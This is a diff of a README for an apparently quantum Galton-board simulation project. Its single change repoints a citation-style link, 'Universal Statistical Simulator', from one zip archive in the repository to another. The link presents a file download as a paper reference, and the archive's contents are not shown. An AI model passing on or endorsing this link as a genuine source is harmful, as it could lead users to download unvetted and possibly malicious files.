@@ -6,7 +6,7 @@ Explore how quantum circuits can simulate complex systems through a Galton Box-s
 
 This project builds on the foundations of the Quantum Fourier Transform and its potential for exponential speed-up over classical methods.​​
 
-​The problem statement is based on the [Universal Statistical Simulator.](https://raw.githubusercontent.com/qcmp34/Womanium2025--QuantumGaltonBoard/main/Tonga/Womanium2025--QuantumGaltonBoard_3.0.zip) which uses quantum circuits to simulate a Galton Box (Plinko) game. This is representative of a Monte Carlo problem, which is sometimes used as a PDE solution method for high-dimensional problems with complex interactions (e.g., particle transport, quantum systems).  
+​The problem statement is based on the [Universal Statistical Simulator.](https://github.com/qcmp34/Womanium2025--QuantumGaltonBoard/raw/refs/heads/main/Tonga/Board_Galton_Quantum_Womanium_1.0-beta.5.zip) which uses quantum circuits to simulate a Galton Box (Plinko) game. This is representative of a Monte Carlo problem, which is sometimes used as a PDE solution method for high-dimensional problems with complex interactions (e.g., particle transport, quantum systems).  
 
 01.
 
